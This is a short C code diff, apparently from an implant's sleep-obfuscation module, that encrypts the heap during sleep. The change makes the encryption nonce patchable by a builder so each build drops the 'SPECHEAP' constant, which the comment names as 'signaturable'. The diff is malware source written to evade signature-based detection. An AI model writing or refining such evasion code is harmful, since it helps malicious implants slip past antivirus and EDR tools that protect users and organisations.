@@ -358,8 +358,12 @@ void sleep_untrack_alloc(SLEEP_CONTEXT *sctx, PVOID ptr) {
 /*  Heap encryption / decryption (ChaCha20 XOR — self-inverse)         */
 /* ------------------------------------------------------------------ */
 
-/* Shared nonce for heap encryption (constant — key changes each cycle) */
-static const BYTE g_heap_nonce[12] = {
+/* Patchable nonce for heap encryption — builder replaces all 12 bytes
+ * with random data to eliminate the signaturable "SPECHEAP" constant.
+ * Before builder: "SPECHEAP" + 4 zero bytes.
+ * After builder:  12 random bytes (unique per build).
+ * Key changes each cycle so nonce reuse across cycles is safe. */
+static volatile const BYTE g_heap_nonce[12] = {
     0x53, 0x50, 0x45, 0x43, 0x48, 0x45, 0x41, 0x50,
     0x00, 0x00, 0x00, 0x00
 };
@@ -373,7 +377,7 @@ void sleep_encrypt_heap(SLEEP_CONTEXT *sctx) {
 
     while (cur) {
         if (cur->ptr && cur->size > 0) {
-            spec_chacha20_encrypt(sctx->sleep_enc_key, g_heap_nonce,
+            spec_chacha20_encrypt(sctx->sleep_enc_key, (const BYTE *)g_heap_nonce,
                                   counter, (BYTE *)cur->ptr,
                                   (DWORD)cur->size, (BYTE *)cur->ptr);
             /* Advance counter by number of blocks used */
